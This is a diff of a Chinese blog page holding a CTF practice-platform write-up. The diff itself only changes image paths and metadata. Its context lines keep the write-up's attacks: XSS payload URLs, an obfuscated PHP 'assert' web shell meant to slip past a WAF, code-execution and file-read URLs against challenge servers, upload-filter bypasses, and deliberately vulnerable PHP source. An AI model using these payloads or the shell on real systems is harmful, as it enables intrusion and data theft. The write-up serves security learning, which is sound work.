@@ -87,19 +87,19 @@
 <meta property="og:site_name" content="m3lon">
 <meta property="og:description" content="输入密码查看flag1234567891011121314151617181920212223# -*- coding: utf-8 -*-import stringimport requestspayload = &apos;1234567890&apos;url=&apos;http://c.bugku.com/baopo/&apos;s = requests.session()r = s.get(url)for a in payl">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/CTF-练习平台writeup/XSS.PNG">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/CTF-练习平台writeup/XSS2.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/CTF-练习平台writeup/1.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/CTF-练习平台writeup/2.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/CTF-练习平台writeup/3.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/CTF-练习平台writeup/4.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/CTF-练习平台writeup/5.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/CTF-练习平台writeup/6.png">
-<meta property="og:updated_time" content="2018-04-26T08:11:20.524Z">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/XSS.PNG">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/XSS2.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/1.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/2.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/3.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/4.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/5.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/6.png">
+<meta property="og:updated_time" content="2019-02-21T12:02:20.975Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CTF 练习平台writeup">
 <meta name="twitter:description" content="输入密码查看flag1234567891011121314151617181920212223# -*- coding: utf-8 -*-import stringimport requestspayload = &apos;1234567890&apos;url=&apos;http://c.bugku.com/baopo/&apos;s = requests.session()r = s.get(url)for a in payl">
-<meta name="twitter:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/CTF-练习平台writeup/XSS.PNG">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/04/26/CTF-练习平台writeup/XSS.PNG">
 
 
 
@@ -423,10 +423,10 @@
 <p>读取flag的姿势 file_get_contents(“php://filter/read=convert.base64-encode/resource=flag.php”)</p>
 <h3 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h3><p>输入的id值，经由document.getElementById(“s”).innerHTML=s，输入到body中，虽然不知道为什么不弹窗，但是_key_值却是在源码中可以查看到的。</p>
 <p>payload:<code>http://103.238.227.13:10089/?id=\u003cscript\u003ealert(_key__27)\u003c/script\u003e</code></p>
-<p><img src="CTF-练习平台writeup/XSS.PNG" alt=""></p>
+<p><img src="XSS.PNG" alt=""></p>
 <p>或者payload：<code>http://103.238.227.13:10089/?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e</code></p>
 <p>成功弹窗</p>
-<p><img src="CTF-练习平台writeup/XSS2.png" alt=""></p>
+<p><img src="XSS2.png" alt=""></p>
 <h3 id="login1（SQL约束攻击）"><a href="#login1（SQL约束攻击）" class="headerlink" title="login1（SQL约束攻击）"></a>login1（SQL约束攻击）</h3><p>SQL 约束用于规定表中的数据规则。如果存在违反约束的数据行为，行为会被约束终止。</p>
 <p><strong>知识点:</strong> </p>
 <ul>
@@ -443,9 +443,9 @@
 <p>参考:<a href="http://goodwaf.com/2016/12/30/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6%E7%9A%84SQL%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">基于约束的SQL攻击</a></p>
 <p><strong>题解：</strong></p>
 <p>点击到注册页面，如果注册admin，会提示admin已存在，利用SQL约束攻击</p>
-<p><img src="CTF-练习平台writeup/1.png" alt=""></p>
+<p><img src="1.png" alt=""></p>
 <p>存入数据库的为admin，所以利用admin，注册密码登录，得到flag。</p>
-<p><img src="CTF-练习平台writeup/2.png" alt=""></p>
+<p><img src="2.png" alt=""></p>
 <h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $poc=<span class="string">"a#s#s#e#r#t"</span>; $poc_1=explode(<span class="string">"#"</span>,$poc); $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; $poc_2($_GET[<span class="string">'s'</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong>知识点1</strong></p>
 <p>assert(mixed assertion): 如果 <code>assertion</code> 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
@@ -465,7 +465,7 @@
 <li><code>http://120.24.86.145:8010/index.php?s=system(&#39;ls&#39;)</code> 尝试能否执行系统命令，执行失败，猜想可能是权限问题</li>
 <li><code>http://120.24.86.145:8010/index.php?s=print_r(glob(&quot;*.*&quot;))</code></li>
 </ul>
-<p><img src="CTF-练习平台writeup/3.png" alt=""></p>
+<p><img src="3.png" alt=""></p>
 <p>读取flag.txt</p>
 <ul>
 <li><code>http://120.24.86.145:8010/index.php?s=show_source(&quot;xyz.php&quot;)</code></li>
@@ -473,16 +473,16 @@
 <li><code>http://120.24.86.145:8010/flag.txt</code></li>
 <li><code>http://120.24.86.145:8010/index.php?s=var_dump(file(&quot;xyz.php&quot;))</code>  file函数是没有办法读取php文件内容的，服务器会对结果进行解析。</li>
 </ul>
-<p><img src="CTF-练习平台writeup/4.png" alt=""></p>
+<p><img src="4.png" alt=""></p>
 <h3 id="各种绕过呦"><a href="#各种绕过呦" class="headerlink" title="各种绕过呦"></a>各种绕过呦</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>); </span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]); </span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>]) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>)) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="CTF-练习平台writeup/5.png" alt=""></p>
+<p><img src="5.png" alt=""></p>
 <h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">	$f = trim(file_get_contents($fn));</span><br><span class="line">	<span class="keyword">if</span> ($ac === $f)</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong>知识点</strong></p>
 <ul>
 <li>extract 可以将$_GET数组的值转为变量，默认是如果有冲突，则覆盖已有的变量。</li>
 <li>==File_get_contents() 利用php://input绕过==。</li>
 </ul>
-<p><img src="CTF-练习平台writeup/6.png" alt=""></p>
+<p><img src="6.png" alt=""></p>
 <h3 id="上传题"><a href="#上传题" class="headerlink" title="上传题"></a>上传题</h3><p>上传题。 各种方法尝试。发现是后缀名黑名单检测和类型检测<br>php别名：php2, php3, php4, php5, phps, pht, phtm, phtml 均试下。<br>发现php5绕过<br>上面的Content-Type的值 大小写绕过</p>
 <h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>题目源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">      $ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">   $ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line">   <span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">"root"</span>;</span><br><span class="line">$pass=<span class="string">"root"</span>;</span><br><span class="line">$db=<span class="string">"sangebaimao"</span>;</span><br><span class="line"> </span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"> </span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"> </span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -667,7 +667,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
